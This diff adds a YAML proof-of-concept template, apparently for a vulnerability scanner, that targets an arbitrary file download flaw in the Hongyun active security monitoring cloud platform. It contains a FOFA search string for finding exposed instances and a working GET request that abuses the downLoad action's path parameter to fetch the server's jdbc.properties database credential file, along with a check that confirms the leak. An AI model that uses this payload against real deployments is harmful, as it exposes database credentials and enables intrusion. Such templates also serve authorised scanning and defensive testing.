@@ -1,0 +1,15 @@
+id: poc-yaml-hongyun-active-security-monitoring-cloud-platform-anyfile-download
+info:
+  name: 鸿运主动安全监控云平台  任意文件下载漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 主动安全监控云平台
+  fofa: body="./open/webApi.html"
+requests:
+- method: GET
+  path: /808gps/MobileAction_downLoad.action?path=/WEB-INF/classes/config/jdbc.properties
+  expression: status_code == 200 && contains(body,"[DATABASE]") && contains(body,"jdbc.connection")
+    && contains(headers,"application/x-download")
+variables: {}
+transport: http
